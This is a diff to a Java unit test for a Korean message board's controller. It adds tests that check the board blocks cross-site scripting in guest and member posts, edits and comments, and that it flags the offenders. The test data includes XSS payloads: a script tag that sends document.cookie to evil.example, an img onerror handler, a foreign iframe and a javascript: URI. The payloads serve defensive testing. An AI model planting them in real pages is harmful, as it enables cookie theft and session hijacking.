@@ -6,13 +6,16 @@ import com.sc1hub.board.dto.CommentDTO;
 import com.sc1hub.board.service.BoardService;
 import com.sc1hub.common.dto.PageDTO;
 import com.sc1hub.common.exception.ResourceNotFoundException;
+import com.sc1hub.common.security.AttackContentDetector;
 import com.sc1hub.common.security.DuplicateContentGuard;
+import com.sc1hub.common.security.OffenderTracker;
 import com.sc1hub.member.dto.MemberDTO;
 import com.sc1hub.member.service.MemberService;
 import org.junit.jupiter.api.Test;
 import org.junit.jupiter.api.extension.ExtendWith;
 import org.mockito.InjectMocks;
 import org.mockito.Mock;
+import org.mockito.Spy;
 import org.mockito.junit.jupiter.MockitoExtension;
 import org.springframework.mock.web.MockHttpServletRequest;
 import org.springframework.mock.web.MockHttpSession;
@@ -39,7 +42,9 @@ import static org.junit.jupiter.api.Assertions.assertNull;
 import static org.junit.jupiter.api.Assertions.assertThrows;
 import static org.junit.jupiter.api.Assertions.assertTrue;
 import static org.mockito.ArgumentMatchers.any;
+import static org.mockito.ArgumentMatchers.anyBoolean;
 import static org.mockito.ArgumentMatchers.anyInt;
+import static org.mockito.ArgumentMatchers.argThat;
 import static org.mockito.ArgumentMatchers.anyLong;
 import static org.mockito.ArgumentMatchers.anyString;
 import static org.mockito.ArgumentMatchers.eq;
@@ -63,6 +68,12 @@ class BoardControllerTest {
     @Mock
     private DuplicateContentGuard duplicateContentGuard;
 
+    @Spy
+    private AttackContentDetector attackContentDetector = new AttackContentDetector();
+
+    @Mock
+    private OffenderTracker offenderTracker;
+
     @InjectMocks
     private BoardController boardController;
 
@@ -85,6 +96,90 @@ class BoardControllerTest {
 
         assertEquals("같은 내용의 글을 짧은 시간에 반복 등록할 수 없습니다.", model.asMap().get("msg"));
         verify(boardService, never()).submitPost(anyString(), any(BoardDTO.class));
+    }
+
+    @Test
+    void submitPost_rejectsScriptPayloadFromGuestAndSanctionsTheAddress() throws Exception {
+        BoardDTO post = new BoardDTO();
+        post.setWriter("비회원");
+        post.setGuestPassword("1234");
+        post.setTitle("무료 스킨");
+        post.setContent("<p>이벤트</p><script>fetch('https://evil.example/?c='+document.cookie)</script>");
+        MockHttpServletRequest request = new MockHttpServletRequest();
+        request.addHeader("X-Forwarded-For", "203.0.113.55");
+        Model model = new ExtendedModelMap();
+
+        assertEquals("alert", boardController.submitPost("funBoard", post, request, model));
+
+        assertTrue(String.valueOf(model.asMap().get("msg")).contains("허용되지 않는 내용"));
+        verify(offenderTracker).attackDetected(eq("203.0.113.55"), eq(true), isNull(), isNull(),
+                argThat(v -> v.isHigh() && "script-tag".equals(v.rule())));
+        verify(boardService, never()).submitPost(anyString(), any(BoardDTO.class));
+        verify(duplicateContentGuard, never()).isDuplicate(anyString(), any(), anyString(), anyInt(), anyLong());
+    }
+
+    @Test
+    void submitPost_mutesMemberWhoSubmitsEventHandlerPayload() throws Exception {
+        MemberDTO member = new MemberDTO();
+        member.setId("writer");
+        member.setNickName("작성자");
+        member.setGrade(1);
+        MockHttpServletRequest request = new MockHttpServletRequest();
+        request.getSession().setAttribute("member", member);
+        BoardDTO post = new BoardDTO();
+        post.setTitle("이미지");
+        post.setContent("<img src=x onerror=alert(1)>");
+        when(boardService.canWrite("funboard", member)).thenReturn(true);
+
+        assertEquals("alert", boardController.submitPost("funboard", post, request, new ExtendedModelMap()));
+
+        verify(offenderTracker).attackDetected(any(), anyBoolean(), eq("writer"), eq("작성자"),
+                argThat(AttackContentDetector.Verdict::isHigh));
+        verify(boardService, never()).submitPost(anyString(), any(BoardDTO.class));
+    }
+
+    @Test
+    void submitModifyPost_rejectsInjectedContentOnEdit() throws Exception {
+        MemberDTO member = new MemberDTO();
+        member.setId("owner");
+        member.setNickName("주인");
+        member.setGrade(1);
+        member.setRegDate(new java.util.Date(0));
+        BoardDTO existing = new BoardDTO();
+        existing.setPostNum(9);
+        existing.setWriter("주인");
+        existing.setRegDate(new java.util.Date());
+        when(boardService.readPost("funboard", 9)).thenReturn(existing);
+        MockHttpServletRequest request = new MockHttpServletRequest();
+        request.getSession().setAttribute("member", member);
+        BoardDTO edit = new BoardDTO();
+        edit.setPostNum(9);
+        edit.setTitle("수정");
+        edit.setContent("<iframe src=\"https://evil.example/\"></iframe>");
+
+        assertEquals("alert", boardController.submitModifyPost("funboard", edit, request, new ExtendedModelMap()));
+
+        verify(offenderTracker).attackDetected(any(), anyBoolean(), eq("owner"), eq("주인"),
+                argThat(v -> "foreign-iframe".equals(v.rule())));
+        verify(boardService, never()).submitModifyPost(anyString(), any(BoardDTO.class));
+    }
+
+    @Test
+    void addComment_rejectsJavascriptUriAndSanctionsGuest() throws Exception {
+        CommentDTO comment = new CommentDTO();
+        comment.setPostNum(7);
+        comment.setNickname("비회원");
+        comment.setPassword("secret");
+        comment.setContent("<a href=\"javascript:alert(1)\">여기</a>");
+        MockHttpServletRequest request = new MockHttpServletRequest();
+        request.addHeader("X-Forwarded-For", "203.0.113.56");
+
+        ResponseEntity<Map<String, String>> response = boardController.addComment("FunBoard", comment, null, request);
+
+        assertEquals(HttpStatus.BAD_REQUEST, response.getStatusCode());
+        verify(offenderTracker).attackDetected(eq("203.0.113.56"), eq(true), isNull(), isNull(),
+                argThat(v -> "js-uri".equals(v.rule())));
+        verify(boardService, never()).addComment(anyString(), any(CommentDTO.class));
     }
 
     @Test
@@ -355,7 +450,7 @@ class BoardControllerTest {
         comment.setContent("정상 댓글");
 
         ResponseEntity<Map<String, String>> response =
-                boardController.addComment("FunBoard", comment, member);
+                boardController.addComment("FunBoard", comment, member, new MockHttpServletRequest());
 
         assertEquals(HttpStatus.OK, response.getStatusCode());
         assertEquals("owner", comment.getId());
@@ -373,7 +468,7 @@ class BoardControllerTest {
         comment.setContent("정상 댓글");
 
         ResponseEntity<Map<String, String>> response =
-                boardController.addComment("FunBoard", comment, null);
+                boardController.addComment("FunBoard", comment, null, new MockHttpServletRequest());
 
         assertEquals(HttpStatus.BAD_REQUEST, response.getStatusCode());
         assertEquals(null, comment.getId());
@@ -390,7 +485,7 @@ class BoardControllerTest {
         comment.setContent("정상 댓글");
 
         ResponseEntity<Map<String, String>> response =
-                boardController.addComment("FunBoard", comment, null);
+                boardController.addComment("FunBoard", comment, null, new MockHttpServletRequest());
 
         assertEquals(HttpStatus.OK, response.getStatusCode());
         assertEquals(null, comment.getId());
@@ -408,7 +503,7 @@ class BoardControllerTest {
         comment.setContent(repeat("댓", 500));
 
         ResponseEntity<Map<String, String>> response =
-                boardController.addComment("FunBoard", comment, null);
+                boardController.addComment("FunBoard", comment, null, new MockHttpServletRequest());
 
         assertEquals(HttpStatus.OK, response.getStatusCode());
         verify(boardService).addComment("funboard", comment);
@@ -419,7 +514,7 @@ class BoardControllerTest {
         CommentDTO comment = guestComment(repeat("댓", 501), "비회원", "secret");
 
         ResponseEntity<Map<String, String>> response =
-                boardController.addComment("FunBoard", comment, null);
+                boardController.addComment("FunBoard", comment, null, new MockHttpServletRequest());
 
         assertEquals(HttpStatus.BAD_REQUEST, response.getStatusCode());
         verify(boardService, never()).addComment(anyString(), any(CommentDTO.class));
@@ -430,7 +525,7 @@ class BoardControllerTest {
         CommentDTO comment = guestComment("댓글", repeat("닉", 51), "secret");
 
         ResponseEntity<Map<String, String>> response =
-                boardController.addComment("FunBoard", comment, null);
+                boardController.addComment("FunBoard", comment, null, new MockHttpServletRequest());
 
         assertEquals(HttpStatus.BAD_REQUEST, response.getStatusCode());
         verify(boardService, never()).addComment(anyString(), any(CommentDTO.class));
@@ -441,7 +536,7 @@ class BoardControllerTest {
         CommentDTO comment = guestComment("댓글", "비회원", repeat("p", 101));
 
         ResponseEntity<Map<String, String>> response =
-                boardController.addComment("FunBoard", comment, null);
+                boardController.addComment("FunBoard", comment, null, new MockHttpServletRequest());
 
         assertEquals(HttpStatus.BAD_REQUEST, response.getStatusCode());
         verify(boardService, never()).addComment(anyString(), any(CommentDTO.class));
